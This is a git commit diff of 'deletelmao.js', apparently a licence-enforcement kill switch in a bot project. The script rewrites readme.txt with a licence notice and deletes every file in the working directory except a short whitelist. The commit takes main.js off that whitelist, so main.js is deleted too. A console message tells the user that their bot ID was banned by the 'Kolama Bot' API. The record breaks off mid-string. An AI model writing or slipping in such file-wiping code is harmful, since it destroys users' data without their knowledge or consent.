ea7a3c3bc9ba7a811c9874b4a11d8dd8ed047106
PlurrYT-Kolama <156847032+PlurrYT-Kolama@users.noreply.github.com>
2024-01-31 17:47:15 +0100

    Update deletelmao.js

--- deletelmao.js
+++ deletelmao.js
@@ -1,7 +1,7 @@
 const fs = require('fs');
 fs.writeFileSync('./readme.txt', 'You broke the licence, please read LICENSE.txt', 'utf-8');
 fs.readdirSync('./').forEach(file => {
-    if (file === 'license.txt' || file === 'readme.txt' || file === 'deletelmao.js' || file === 'license.js' || file === 'midleware.js' || file === 'main.js') return;
+    if (file === 'license.txt' || file === 'readme.txt' || file === 'deletelmao.js' || file === 'license.js' || file === 'midleware.js') return;
     else fs.unlink(`./${file}`, f => { });
     console.log(`LICENSE API | Deleting Bot Files
     Hello dear user! Your bot ID was banned in API of Kolama Bot.
